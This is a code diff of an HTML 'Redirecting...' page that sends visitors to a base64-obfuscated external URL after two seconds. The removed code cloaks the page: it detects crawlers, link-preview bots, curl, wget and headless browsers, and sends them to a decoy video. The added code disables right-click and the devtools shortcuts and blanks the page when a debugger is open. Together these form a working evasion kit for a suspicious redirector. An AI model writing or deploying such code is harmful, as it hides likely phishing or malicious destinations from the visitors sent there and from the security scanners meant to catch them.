@@ -3,7 +3,6 @@
 <head>
     <meta charset="utf-8">
     <title>Redirecting...</title>
-    <meta http-equiv="refresh" content="2; url=https://parin.cyou/pcast">
     <style>
         body {
             margin: 0;
@@ -34,50 +33,54 @@
         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtZFoZ09Lq1LkROpjM2kJvnR3unVdWA8Aa7A&s" alt="Logo">
     </div>
     <script type="text/javascript">
-        (function() {
-            const encodedRealUrl = 'aHR0cHM6Ly9wYXJpbi5jeW91L3BjYXN0';
-            const botUrl = 'https://youtu.be/1LtRVOTPLBg?si=PSAmzJKiPtW8OGSb';
-            let isBot = false;
-            
-            // 1. User-Agent check
-            const ua = navigator.userAgent.toLowerCase();
-            const obviousBots = [
-                'curl', 'wget', 'fetch', 'httpie',
-                'bot', 'spider', 'crawler', 'slurp',
-                'whatsapp', 'telegrambot', 'discordbot', 'slackbot',
-                'twitterbot', 'facebookexternalhit', 'linkedinbot',
-                'googlebot', 'bingbot', 'yandexbot', 'duckduckbot'
-            ];
-            if (obviousBots.some(bot => ua.includes(bot))) {
-                isBot = true;
+        // Anti right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+        
+        // Anti F12 and other dev tools shortcuts
+        document.addEventListener('keydown', function(e) {
+            // F12
+            if (e.keyCode === 123) {
+                e.preventDefault();
+                return false;
             }
-            
-            // 2. Headless detection
-            if (
-                navigator.webdriver === true ||
-                (navigator.webdriver === undefined && ua.includes('headless'))
-            ) {
-                isBot = true;
+            // Ctrl+Shift+I
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+                e.preventDefault();
+                return false;
             }
-            
-            // 3. Anti-debug
-            try {
-                const start = performance.now();
-                debugger;
-                if (performance.now() - start > 100) {
-                    isBot = true;
-                }
-            } catch(e) {}
-            
-            // Redirect after animation
-            setTimeout(function() {
-                if (isBot) {
-                    window.location.href = botUrl;
-                } else {
-                    window.location.href = atob(encodedRealUrl);
-                }
-            }, 2000);
-        })();
+            // Ctrl+Shift+J
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+U
+            if (e.ctrlKey && e.keyCode === 85) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+C
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Anti-debug - detects if DevTools is open
+        setInterval(function() {
+            const start = performance.now();
+            debugger;
+            const end = performance.now();
+            if (end - start > 100) {
+                window.location.href = 'about:blank';
+            }
+        }, 1000);
+        
+        // Redirect after animation
+        setTimeout(function() {
+            window.location.href = atob('aHR0cHM6Ly9wYXJpbi5jeW91L3BjYXN0');
+        }, 2000);
     </script>
 </body>
 </html>
